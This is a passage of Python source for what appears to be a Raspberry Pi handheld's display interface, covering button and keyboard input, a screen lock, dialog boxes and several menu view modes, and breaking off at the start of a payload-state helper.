        # Poll WebUI payload launch request
        if not screen_lock.is_set():
            req = _check_payload_request()
            if req:
                exec_payload(req)
                continue

        # Virtual button from WebUI (Unix socket) — works with or without GPIO hardware
        if HAS_INPUT:
            try:
                v = rj_input.get_virtual_button()
                if v:
                    # Special: WebUI can send "MANUAL_LOCK" to trigger the lock combo
                    if v == "MANUAL_LOCK":
                        _mark_user_activity()
                        lock_device("Manual lock")
                        start = time.time()
                        continue
                    _mark_user_activity()
                    _last_button = None
                    return v
            except Exception:
                pass

        # Keyboard input from USB/Bluetooth keyboards
        if HAS_KEYBOARD:
            try:
                k = keyboard_input.get_keyboard_button(timeout_ms=10)
                if k:
                    _mark_user_activity()
                    _last_button = None
                    return k
            except Exception:
                pass

        if not HAS_HW:
            time.sleep(0.1)
            continue

        # Physical GPIO
        pressed = None
        for name, pin in PINS.items():
            try:
                if GPIO.input(pin) == 0:
                    pressed = name
                    break
            except Exception:
                pass

        if pressed is None:
            _last_button = None
            time.sleep(0.01)
            continue

        now = time.time()

        # ── KEY3 long-hold → lock screen ──────────────────────────────────────
        # If KEY3 is held for _LOCK_HOLD_SECS, trigger lock instead of repeating.
        if (pressed == _LOCK_HOLD_BTN
                and pressed == _last_button
                and (now - _button_down_since) >= _LOCK_HOLD_SECS):
            _last_button = None
            _mark_user_activity()
            lock_device("Manual lock")
            start = time.time()
            continue

        # Stuck-button safety: non-KEY3 buttons held >4s are discarded
        if pressed == _last_button and pressed != _LOCK_HOLD_BTN and (now - _button_down_since) > 4.0:
            _last_button = None
            time.sleep(0.15)
            continue

        if pressed != _last_button:
            _last_button       = pressed
            _last_button_time  = now
            _button_down_since = now
            _mark_user_activity()
            return pressed

        if (now - _last_button_time) < _debounce_s:
            time.sleep(0.01)
            continue
        if ((now - _button_down_since) >= _repeat_delay
                and (now - _last_button_time) >= _repeat_interval):
            _last_button_time = now
            return pressed
        time.sleep(0.01)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Text / drawing helpers ─────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _centered(text, y, font=None, fill=None):
    if font is None: font = text_font
    if fill is None: fill = color.selected_text
    bbox = draw.textbbox((0,0), text, font=font)
    w    = bbox[2] - bbox[0]
    draw.text(((128-w)//2, y), text, font=font, fill=fill)


def _truncate(text, max_w, font=None, ellipsis="…"):
    if font is None: font = text_font
    if not text: return ""
    if draw.textbbox((0,0), text, font=font)[2] <= max_w:
        return text
    ew   = draw.textbbox((0,0), ellipsis, font=font)[2]
    lo, hi, best = 0, len(text), ""
    while lo <= hi:
        mid = (lo+hi)//2
        w   = draw.textbbox((0,0), text[:mid], font=font)[2]
        if w + ew <= max_w:
            best = text[:mid]; lo = mid+1
        else:
            hi = mid-1
    return best + ellipsis


def Dialog(text, wait=True):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([0,12,128,128],   fill=color.background)
        draw.rectangle([4,16,124,112],   fill=color.panel_bg)
        draw.rectangle([4,16,124,112],   outline=color.border, width=1)
        # horizontal rule
        draw.line([(4,100),(124,100)],   fill=color.border, width=1)
        lines = text.splitlines()
        y = 16 + max(4, (84 - len(lines)*14)//2)
        for line in lines:
            _centered(line, y, fill=color.text)
            y += 14
        # OK button
        draw.rectangle([44,102,84,112],  fill=color.select)
        _centered("OK", 103, fill=color.selected_text)
    if wait:
        time.sleep(0.25)
        getButton()


def Dialog_info(text, wait=True, timeout=None):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([3,14,124,124], fill=color.select)
        draw.rectangle([3,14,124,124], outline=color.border, width=2)
        lines = text.splitlines()
        y     = 14 + max(0, (110 - len(lines)*14)//2)
        for line in lines:
            _centered(line, y, fill=color.selected_text)
            y += 14
    if wait:
        time.sleep(0.25)
        getButton()
    elif timeout:
        end = time.time() + timeout
        while time.time() < end:
            time.sleep(0.2)


def YNDialog(a="Are you sure?", y="Yes", n="No", b=""):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([0,12,128,128],  fill=color.background)
        draw.rectangle([4,16,124,118],  fill=color.panel_bg)
        draw.rectangle([4,16,124,118],  outline=color.border, width=1)
        _centered(a, 20, fill=color.selected_text)
        if b: _centered(b, 36, fill=color.text)
        draw.line([(4,52),(124,52)],    fill=color.border, width=1)
    time.sleep(0.25)
    answer = False
    while True:
        with draw_lock:
            _draw_toolbar()
            # YES button
            yc_bg = color.select  if answer      else "#1a0505"
            nc_bg = color.select  if not answer  else "#1a0505"
            yc_tx = color.selected_text if answer      else color.text
            nc_tx = color.selected_text if not answer  else color.text
            draw.rectangle([8,56,58,72],   fill=yc_bg, outline=color.border)
            draw.rectangle([70,56,120,72], fill=nc_bg, outline=color.border)
            _centered(y, 58, fill=yc_tx)
            draw.text((76,58), n, font=text_font, fill=nc_tx)
            # hint
            draw.line([(4,80),(124,80)], fill="#2a0505", width=1)
            _centered("LEFT=Yes  RIGHT=No", 84, font=small_font, fill="#4a2020")
        btn = getButton()
        if   btn in ("KEY_LEFT_PIN","KEY1_PIN"):    answer = True
        elif btn in ("KEY_RIGHT_PIN","KEY3_PIN"):   answer = False
        elif btn in ("KEY_PRESS_PIN","KEY2_PIN"):   return answer


def _draw_row_selection(row_y, row_h):
    """Draw menu row selection with style from theme."""
    style = str(_ui_ux.get("select_style", "fill"))
    if style == "outline":
        draw.rectangle([3, row_y, 124, row_y + row_h - 1], outline=color.select, width=2)
    elif style == "pulse":
        phase = (math.sin(time.time() * 6.0) + 1.0) * 0.5
        blend_r = int(color.select[1:3], 16)
        blend_g = int(color.select[3:5], 16)
        blend_b = int(color.select[5:7], 16)
        bg_r = int(color.background[1:3], 16)
        bg_g = int(color.background[3:5], 16)
        bg_b = int(color.background[5:7], 16)
        r = int(blend_r + (bg_r - blend_r) * phase)
        g = int(blend_g + (bg_g - blend_g) * phase)
        b = int(blend_b + (bg_b - blend_b) * phase)
        blend_col = f"#{r:02X}{g:02X}{b:02X}"
        draw.rectangle([3, row_y, 124, row_y + row_h - 1], fill=blend_col)
        draw.rectangle([3, row_y, 124, row_y + row_h - 1], outline=color.border, width=1)
    elif style == "scanline":
        draw.rectangle([3, row_y, 124, row_y + row_h - 1], fill=color.select)
        line_y = row_y + int((time.time() * 35) % max(1, row_h - 1))
        draw.line([(4, line_y), (123, line_y)], fill=color.selected_text, width=1)
    else:
        draw.rectangle([3, row_y, 124, row_y + row_h - 1], fill=color.select)


def _handle_menu_key3():
    """Stop the active operation from menu screens without navigating away."""
    if ktox_state.get("running"):
        ktox_state["running"] = None
        Dialog_info("Stopped.", wait=False, timeout=1)
        return True
    return False


def GetMenu(inlist, duplicates=False, title="Menu", view_modes=False):
    """
    Dispatcher function that routes to the correct view mode rendering function.
    Alternate view modes are opt-in for the Home launcher. Content screens,
    pickers, logs, and submenus use the professional list renderer by default.
    """
    if not view_modes:
        return GetMenuString(inlist, duplicates=duplicates, title=title)
    mode_map = {
        "list": GetMenuString,
        "grid": GetMenuGrid,
        "carousel": GetMenuCarousel,
        "panel": GetMenuPanel,
        "table": GetMenuTable,
        "paged": GetMenuPaged,
        "thumbnail": GetMenuThumbnail,
        "vcarousel": GetMenuVerticalCarousel,
    }
    func = mode_map.get(_view_mode, GetMenuString)
    if func is GetMenuString:
        return func(inlist, duplicates=duplicates, title=title)
    return func(inlist, duplicates=duplicates)


def GetMenuString(inlist, duplicates=False, title="Menu"):
    """
    Scrollable list.  Returns selected label string, or "" on back.
    If duplicates=True returns (int_index, label_string).
    KEY1/KEY2 act as back/escape. KEY3 stops an active operation.
    """
    start_y, row_h, WINDOW = _menu_metrics()
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]
    total  = len(inlist)
    index  = 0
    offset = 0

    while True:
        if index < offset:           offset = index
        elif index >= offset+WINDOW: offset = index - WINDOW + 1
        window = inlist[offset:offset+WINDOW]

        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()
            _draw_menu_title(title)
            for i, raw in enumerate(window):
                txt   = raw if not duplicates else raw.split("#", 1)[1]
                sel   = (i == index - offset)
                row_y = start_y + row_h * i
                if sel:
                    _draw_row_selection(row_y, row_h)
                fill = color.selected_text if sel else color.text
                icon = _icon_for(txt)
                if icon and _ui_ux.get("show_icons", True):
                    draw.text((11, row_y + row_h // 2), icon, font=icon_font, fill=fill, anchor="mm")
                    t = _truncate(txt.strip().lstrip("✔*+-•> "), 96)
                    draw.text((23, row_y + 2), t, font=text_font, fill=fill)
                else:
                    t = _truncate(txt.strip(), 112)
                    draw.text((7, row_y + 2), t, font=text_font, fill=fill)
            _draw_scroll_pip(total, offset, WINDOW, start_y, row_h)

        time.sleep(0.08)
        btn = getButton(timeout=0.5)   # short timeout prevents deadlock
        if   btn is None:                              continue
        elif btn == "KEY_DOWN_PIN":                    index = (index+1) % total
        elif btn == "KEY_UP_PIN":                      index = (index-1) % total
        elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn == "KEY3_PIN":
            _handle_menu_key3()
            continue
        elif btn in ("KEY_LEFT_PIN","KEY1_PIN","KEY2_PIN"):
            return (-1,"") if duplicates else ""


def RenderMenuWindowOnce(inlist, selected=0):
    start_y, row_h, WINDOW = _menu_metrics()
    if not inlist: inlist = ["(empty)"]
    total  = len(inlist)
    idx    = max(0, min(selected, total-1))
    offset = max(0, min(idx-2, total-WINDOW))
    window = inlist[offset:offset+WINDOW]
    with draw_lock:
        _draw_toolbar()
        color.DrawMenuBackground()
        color.DrawBorder()
        _draw_menu_title("home")
        for i, txt in enumerate(window):
            sel   = (i == idx - offset)
            row_y = start_y + row_h * i
            if sel:
                _draw_row_selection(row_y, row_h)
            fill = color.selected_text if sel else color.text
            icon = _icon_for(txt)
            if icon and _ui_ux.get("show_icons", True):
                draw.text((11, row_y + row_h // 2), icon, font=icon_font, fill=fill, anchor="mm")
                t = _truncate(txt.strip(), 96)
                draw.text((23, row_y + 2), t, font=text_font, fill=fill)
            else:
                t = _truncate(txt.strip(), 112)
                draw.text((7, row_y + 2), t, font=text_font, fill=fill)
        _draw_scroll_pip(total, offset, WINDOW, start_y, row_h)
        # Optional cyber bars for themes like DarkSec
        if _ui_ux.get("cyber_bars", False):
            span = row_h * WINDOW
            y0 = start_y + span + 1
            y1 = min(123, y0 + 3)
            offs = int((time.time() * 22) % 20)
            for i in range(0, 120, 20):
                x = 4 + ((i + offs) % 120)
                draw.line([(x, y0), (min(123, x + 8), y0)], fill=color.border, width=1)
            draw.line([(4, y1), (123, y1)], fill=color.title_bg, width=1)


def GetMenuGrid(inlist, duplicates=False):
    """
    2-column grid with spacious, well-separated cells.
    Returns selected label string, or "" on back.
    """
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]

    total = len(inlist)
    index = 0
    COLS = 2
    ROWS = 3
    ITEMS_PER_VIEW = COLS * ROWS
    CELL_W = 58
    CELL_H = 33
    GAP = 3
    START_X = 4
    START_Y = 18

    while True:
        offset = (index // ITEMS_PER_VIEW) * ITEMS_PER_VIEW

        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()

            for i, raw in enumerate(inlist[offset:offset+ITEMS_PER_VIEW]):
                if offset + i >= total:
                    break
                txt = raw if not duplicates else raw.split("#", 1)[1]
                row = i // COLS
                col = i % COLS
                x = START_X + col * (CELL_W + GAP)
                y = START_Y + row * (CELL_H + GAP)
                sel = (offset + i == index)

                if sel:
                    draw.rectangle([x, y, x + CELL_W, y + CELL_H], fill=color.select, outline=color.border, width=2)
                else:
                    draw.rectangle([x, y, x + CELL_W, y + CELL_H], fill=color.panel_bg, outline=color.border, width=1)

                fill = color.selected_text if sel else color.text
                icon = _icon_for(txt)
                if icon and _ui_ux.get("show_icons", True):
                    draw.text((x + CELL_W // 2, y + 11), icon, font=medium_icon_font or icon_font, fill=fill, anchor="mm")
                    t = _truncate(txt.strip(), CELL_W - 8, font=small_font)
                    draw.text((x + CELL_W // 2, y + CELL_H - 6), t, font=small_font, fill=fill, anchor="mm")
                else:
                    t = _truncate(txt.strip(), CELL_W - 10, font=text_font)
                    draw.text((x + CELL_W // 2, y + (CELL_H // 2)), t, font=text_font, fill=fill, anchor="mm")

            pages = (total + ITEMS_PER_VIEW - 1) // ITEMS_PER_VIEW
            if pages > 1:
                page = (offset // ITEMS_PER_VIEW) + 1
                draw.rectangle([84, 14, 124, 24], fill=color.title_bg, outline=color.border, width=1)
                draw.text((104, 19), f"{page}/{pages}", font=small_font, fill=color.text, anchor="mm")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if btn is None:
            continue
        elif btn == "KEY_DOWN_PIN":
            index = min(index + COLS, total - 1)
        elif btn == "KEY_UP_PIN":
            index = max(index - COLS, 0)
        elif btn == "KEY_RIGHT_PIN":
            index = min(index + 1, total - 1)
        elif btn == "KEY_LEFT_PIN":
            index = max(index - 1, 0) if index % COLS != 0 else index
        elif btn == "KEY_PRESS_PIN":
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn == "KEY3_PIN":
            _handle_menu_key3()
            continue
        elif btn in ("KEY1_PIN", "KEY2_PIN"):
            return (-1, "") if duplicates else ""


def GetMenuCarousel(inlist, duplicates=False):
    """
    Carousel mode: single item focus with left/right navigation.
    Returns selected label string, or "" on back.
    """
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]

    total = len(inlist)
    index = 0

    while True:
        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()

            raw = inlist[index]
            txt = raw if not duplicates else raw.split("#", 1)[1]

            draw.rectangle([3, 20, 124, 115], fill=color.panel_bg, outline=color.border, width=1)

            icon = _icon_for(txt)
            if icon and _ui_ux.get("show_icons", True):
                draw.text((64, 62), icon, font=xlarge_icon_font or large_icon_font, fill=color.selected_text, anchor="mm")
                draw.rectangle([8, 93, 119, 112], fill=color.title_bg, outline=color.border, width=1)
                display_txt = _truncate(txt.strip().lstrip("✔*+-•> "), 102, font=text_font)
                draw.text((64, 102), display_txt, font=text_font, fill=color.selected_text, anchor="mm")
            else:
                display_txt = _truncate(txt.strip(), 100)
                draw.text((64, 60), display_txt, font=text_font, fill=color.selected_text, anchor="mm")

            if total > 1:
                if index > 0:
                    draw.text((12, 64), "◄", font=text_font, fill=color.text, anchor="mm")
                if index < total - 1:
                    draw.text((116, 64), "►", font=text_font, fill=color.text, anchor="mm")

            draw.rectangle([84, 14, 124, 24], fill=color.title_bg, outline=color.border, width=1)
            draw.text((104, 19), f"{index+1}/{total}", font=small_font, fill=color.text, anchor="mm")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if btn is None:
            continue
        elif btn == "KEY_LEFT_PIN":
            index = (index - 1) % total
        elif btn == "KEY_RIGHT_PIN":
            index = (index + 1) % total
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total
        elif btn == "KEY_DOWN_PIN":
            index = (index + 1) % total
        elif btn == "KEY_PRESS_PIN":
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn == "KEY3_PIN":
            _handle_menu_key3()
            continue
        elif btn in ("KEY1_PIN", "KEY2_PIN"):
            return (-1, "") if duplicates else ""


def RenderMenuGridOnce(inlist, selected=0):
    """Non-interactive grid snapshot."""
    if not inlist:
        inlist = ["(empty)"]

    total = len(inlist)
    idx = max(0, min(selected, total - 1))
    COLS = 2
    ROWS = 4
    CELL_W = 60
    CELL_H = 25
    START_X = 8
    START_Y = 20

    with draw_lock:
        _draw_toolbar()
        color.DrawMenuBackground()
        color.DrawBorder()

        for i, txt in enumerate(inlist[:COLS * ROWS]):
            if i >= total:
                break
            row = i // COLS
            col = i % COLS
            x = START_X + col * CELL_W
            y = START_Y + row * CELL_H
            sel = (i == idx)

            if sel:
                draw.rectangle([x, y, x + CELL_W - 2, y + CELL_H - 2],
                             fill=color.select, outline=color.border, width=1)
            else:
                draw.rectangle([x, y, x + CELL_W - 2, y + CELL_H - 2],
                             outline=color.border, width=1)

            fill = color.selected_text if sel else color.text
            t = _truncate(txt.strip(), 40)
            draw.text((x + 3, y + 7), t, font=small_font, fill=fill)


def RenderMenuCarouselOnce(inlist, selected=0):
    """Non-interactive carousel snapshot."""
    if not inlist:
        inlist = ["(empty)"]

    total = len(inlist)
    idx = max(0, min(selected, total - 1))
    txt = inlist[idx]

    with draw_lock:
        _draw_toolbar()
        color.DrawMenuBackground()
        color.DrawBorder()

        draw.rectangle([3, 20, 124, 115], fill=color.panel_bg, outline=color.border, width=1)

        icon = _icon_for(txt)
        if icon and _ui_ux.get("show_icons", True):
            draw.text((64, 62), icon, font=xlarge_icon_font or large_icon_font, fill=color.selected_text, anchor="mm")
            draw.rectangle([8, 93, 119, 112], fill=color.title_bg, outline=color.border, width=1)
            display_txt = _truncate(txt.strip().lstrip("✔*+-•> "), 102, font=text_font)
            draw.text((64, 102), display_txt, font=text_font, fill=color.selected_text, anchor="mm")
        else:
            display_txt = _truncate(txt.strip(), 100)
            draw.text((64, 60), display_txt, font=text_font, fill=color.selected_text, anchor="mm")

        if total > 1:
            if idx > 0:
                draw.text((12, 64), "◄", font=text_font, fill=color.text, anchor="mm")
            if idx < total - 1:
                draw.text((116, 64), "►", font=text_font, fill=color.text, anchor="mm")

        draw.rectangle([84, 14, 124, 24], fill=color.title_bg, outline=color.border, width=1)
        draw.text((104, 19), f"{idx+1}/{total}", font=small_font, fill=color.text, anchor="mm")


def GetMenuPanel(inlist, duplicates=False):
    """
    Panel view: scrolling sidebar with big icons on left, content on right.
    Returns selected label string, or "" on back.
    """
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]

    total = len(inlist)
    index = 0
    SIDEBAR_ITEMS = 5
    ICON_H = 20

    while True:
        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()

            draw.rectangle([3, 14, 34, 127], fill=color.panel_bg, outline=color.border, width=1)

            offset = max(0, min(index - SIDEBAR_ITEMS // 2, total - SIDEBAR_ITEMS))
            for i in range(SIDEBAR_ITEMS):
                item_idx = offset + i
                if item_idx >= total:
                    break
                label = inlist[item_idx] if not duplicates else inlist[item_idx].split("#", 1)[1]
                y = 18 + i * ICON_H
                sel_item = (item_idx == index)
                fill = color.selected_text if sel_item else color.text
                if sel_item:
                    draw.rectangle([5, y - 1, 32, y + 17], fill=color.select, outline=color.border, width=1)

                icon = _icon_for(label)
                if icon and _ui_ux.get("show_icons", True):
                    draw.text((18, y + 8), icon, font=icon_font or small_font, fill=fill, anchor="mm")
                else:
                    draw.text((18, y + 8), (label.strip()[:1] or "•"), font=small_font, fill=fill, anchor="mm")

            if total > 0:
                raw = inlist[index]
                txt = raw if not duplicates else raw.split("#", 1)[1]
                draw.rectangle([36, 15, 125, 125], outline=color.border, width=2, fill=color.background)

                icon = _icon_for(txt)
                if icon and _ui_ux.get("show_icons", True):
                    draw.text((80, 66), icon, font=xlarge_icon_font or large_icon_font, fill=color.selected_text, anchor="mm")
                    display_txt = _truncate(txt.strip(), 82, font=text_font)
                    draw.text((80, 109), display_txt, font=text_font, fill=color.selected_text, anchor="mm")
                else:
                    display_txt = _truncate(txt.strip(), 50)
                    draw.text((80, 60), display_txt, font=text_font, fill=color.selected_text, anchor="mm")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if btn is None:
            continue
        elif btn == "KEY_DOWN_PIN":
            index = (index + 1) % total
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total
        elif btn == "KEY_PRESS_PIN":
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn == "KEY3_PIN":
            _handle_menu_key3()
            continue
        elif btn in ("KEY1_PIN", "KEY2_PIN", "KEY_LEFT_PIN"):
            return (-1, "") if duplicates else ""


def GetMenuTable(inlist, duplicates=False):
    """
    Table view: 2-column compact table layout.
    Returns selected label string, or "" on back.
    """
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]

    total = len(inlist)
    index = 0
    ROWS = 3
    ITEMS_PER_VIEW = ROWS
    CELL_H = 33
    START_X = 4
    START_Y = 18

    while True:
        offset = (index // ITEMS_PER_VIEW) * ITEMS_PER_VIEW

        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()

            draw.line([(1, 14), (127, 14)], fill=color.border, width=1)

            for i, raw in enumerate(inlist[offset:offset+ITEMS_PER_VIEW]):
                if offset + i >= total:
                    break
                txt = raw if not duplicates else raw.split("#", 1)[1]
                x = START_X
                y = START_Y + i * CELL_H
                sel = (offset + i == index)

                if sel:
                    draw.rectangle([x, y, 123, y + CELL_H - 2], fill=color.select, outline=color.border, width=1)
                    fill = color.selected_text
                else:
                    draw.rectangle([x, y, 123, y + CELL_H - 2], outline=color.border, width=1)
                    fill = color.text

                draw.text((x + 4, y + (CELL_H // 2)), f"{offset + i + 1:02d}", font=small_font, fill=fill, anchor="lm")
                icon = _icon_for(txt)
                if icon and _ui_ux.get("show_icons", True):
                    draw.text((x + 28, y + (CELL_H // 2)), icon, font=medium_icon_font or icon_font, fill=fill, anchor="mm")
                    t = _truncate(txt.strip(), 72, font=text_font)
                    draw.text((x + 38, y + (CELL_H // 2)), t, font=text_font, fill=fill, anchor="lm")
                else:
                    t = _truncate(txt.strip(), 90, font=text_font)
                    draw.text((x + 28, y + (CELL_H // 2)), t, font=text_font, fill=fill, anchor="lm")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if btn is None:
            continue
        elif btn == "KEY_DOWN_PIN":
            index = min(index + 1, total - 1)
        elif btn == "KEY_UP_PIN":
            index = max(index - 1, 0)
        elif btn == "KEY_RIGHT_PIN":
            index = min(index + 1, total - 1)
        elif btn == "KEY_LEFT_PIN":
            index = max(index - 1, 0)
        elif btn == "KEY_PRESS_PIN":
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn == "KEY3_PIN":
            _handle_menu_key3()
            continue
        elif btn in ("KEY1_PIN", "KEY2_PIN"):
            return (-1, "") if duplicates else ""


def GetMenuPaged(inlist, duplicates=False):
    """
    Paged view: fixed 3-item display per page with navigation.
    Returns selected label string, or "" on back.
    """
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]

    total = len(inlist)
    index = 0
    ITEMS_PER_PAGE = 2
    ITEM_H = 49
    START_Y = 26

    while True:
        page = index // ITEMS_PER_PAGE
        page_items = inlist[page * ITEMS_PER_PAGE:(page + 1) * ITEMS_PER_PAGE]

        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()

            draw.rectangle([3, 13, 125, 24], fill=color.title_bg)
            page_text = f"Page {page + 1}/{(total + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE}"
            _centered(page_text, 14, font=small_font, fill=color.border)
            draw.line([(3, 24), (125, 24)], fill=color.border, width=1)

            for i, raw in enumerate(page_items):
                txt = raw if not duplicates else raw.split("#", 1)[1]
                y = START_Y + i * ITEM_H
                sel = (page * ITEMS_PER_PAGE + i == index)

                if sel:
                    draw.rectangle([3, y, 125, y + ITEM_H - 2], fill=color.select, outline=color.border, width=1)
                    fill = color.selected_text
                else:
                    draw.rectangle([3, y, 125, y + ITEM_H - 2], outline=color.border, width=1)
                    fill = color.text

                icon = _icon_for(txt)
                if icon and _ui_ux.get("show_icons", True):
                    draw.text((33, y + (ITEM_H // 2) - 3), icon, font=large_icon_font or medium_icon_font or icon_font, fill=fill, anchor="mm")
                    t = _truncate(txt.strip(), 74, font=text_font)
                    draw.text((87, y + (ITEM_H // 2) + 8), t, font=text_font, fill=fill, anchor="mm")
                else:
                    t = _truncate(txt.strip(), 100, font=text_font)
                    draw.text((64, y + (ITEM_H // 2)), t, font=text_font, fill=fill, anchor="mm")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if btn is None:
            continue
        elif btn in ("KEY_DOWN_PIN", "KEY_RIGHT_PIN"):
            index = min(index + 1, total - 1)
        elif btn in ("KEY_UP_PIN", "KEY_LEFT_PIN"):
            index = max(index - 1, 0)
        elif btn == "KEY_PRESS_PIN":
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn == "KEY3_PIN":
            _handle_menu_key3()
            continue
        elif btn in ("KEY1_PIN", "KEY2_PIN"):
            return (-1, "") if duplicates else ""


def GetMenuThumbnail(inlist, duplicates=False):
    """
    Thumbnail view: large icons with labels in a 2x2 grid.
    Returns selected label string, or "" on back.
    """
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]

    total = len(inlist)
    index = 0
    COLS = 2
    ROWS = 2
    ITEMS_PER_VIEW = COLS * ROWS
    CELL_W = 59
    CELL_H = 51
    START_X = 4
    START_Y = 17

    while True:
        offset = (index // ITEMS_PER_VIEW) * ITEMS_PER_VIEW

        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()

            for i, raw in enumerate(inlist[offset:offset+ITEMS_PER_VIEW]):
                if offset + i >= total:
                    break
                txt = raw if not duplicates else raw.split("#", 1)[1]
                row = i // COLS
                col = i % COLS
                x = START_X + col * CELL_W
                y = START_Y + row * CELL_H
                sel = (offset + i == index)

                if sel:
                    draw.rectangle([x, y, x + CELL_W - 2, y + CELL_H - 2],
                                 fill=color.select, outline=color.border, width=2)
                    icon_fill = color.selected_text
                    text_fill = color.selected_text
                else:
                    draw.rectangle([x, y, x + CELL_W - 2, y + CELL_H - 2],
                                 outline=color.border, width=1)
                    icon_fill = color.text
                    text_fill = color.text

                icon = _icon_for(txt)
                if icon and _ui_ux.get("show_icons", True):
                    draw.text((x + (CELL_W // 2), y + 16), icon, font=large_icon_font or medium_icon_font or icon_font, fill=icon_fill, anchor="mm")
                    label = _truncate(txt.strip(), CELL_W - 8, font=small_font)
                    draw.text((x + (CELL_W // 2), y + 41), label, font=small_font, fill=text_fill, anchor="mm")
                else:
                    label = _truncate(txt.strip(), CELL_W - 10, font=text_font)
                    draw.text((x + (CELL_W // 2), y + 24), label, font=text_font, fill=text_fill, anchor="mm")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if btn is None:
            continue
        elif btn == "KEY_DOWN_PIN":
            index = min(index + COLS, total - 1)
        elif btn == "KEY_UP_PIN":
            index = max(index - COLS, 0)
        elif btn == "KEY_RIGHT_PIN":
            index = min(index + 1, total - 1)
        elif btn == "KEY_LEFT_PIN":
            index = max(index - 1, 0) if index % COLS != 0 else index
        elif btn == "KEY_PRESS_PIN":
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn == "KEY3_PIN":
            _handle_menu_key3()
            continue
        elif btn in ("KEY1_PIN", "KEY2_PIN"):
            return (-1, "") if duplicates else ""


def GetMenuVerticalCarousel(inlist, duplicates=False):
    """
    Vertical carousel: single item focus with up/down navigation.
    Returns selected label string, or "" on back.
    """
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]

    total = len(inlist)
    index = 0

    while True:
        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()

            draw.rectangle([3, 20, 124, 115], fill=color.panel_bg, outline=color.border, width=1)

            raw = inlist[index]
            txt = raw if not duplicates else raw.split("#", 1)[1]

            icon = _icon_for(txt)
            if icon and _ui_ux.get("show_icons", True):
                draw.text((64, 62), icon, font=xlarge_icon_font or large_icon_font, fill=color.selected_text, anchor="mm")
                draw.rectangle([8, 93, 119, 112], fill=color.title_bg, outline=color.border, width=1)
                display_txt = _truncate(txt.strip().lstrip("✔*+-•> "), 102, font=text_font)
                draw.text((64, 102), display_txt, font=text_font, fill=color.selected_text, anchor="mm")
            else:
                display_txt = _truncate(txt.strip(), 100)
                draw.text((64, 60), display_txt, font=text_font, fill=color.selected_text, anchor="mm")

            if total > 1:
                if index > 0:
                    draw.text((64, 28), "▲", font=text_font, fill=color.text, anchor="mm")
                if index < total - 1:
                    draw.text((64, 88), "▼", font=text_font, fill=color.text, anchor="mm")

            draw.rectangle([84, 14, 124, 24], fill=color.title_bg, outline=color.border, width=1)
            draw.text((104, 19), f"{index+1}/{total}", font=small_font, fill=color.text, anchor="mm")

        time.sleep(0.08)
        btn = getButton(timeout=0.5)
        if btn is None:
            continue
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total
        elif btn == "KEY_DOWN_PIN":
            index = (index + 1) % total
        elif btn == "KEY_LEFT_PIN":
            index = (index - 1) % total
        elif btn == "KEY_RIGHT_PIN":
            index = (index + 1) % total
        elif btn == "KEY_PRESS_PIN":
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn == "KEY3_PIN":
            _handle_menu_key3()
            continue
        elif btn in ("KEY1_PIN", "KEY2_PIN"):
            return (-1, "") if duplicates else ""

# ═══════════════════════════════════════════════════════════════════════════════
# ── Payload engine ─────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _write_payload_state(running: bool, path=None):
    try:
        with open(PAYLOAD_STATE_PATH, "w") as f:
            json.dump({"running": running, "path": path, "ts": time.time()}, f)
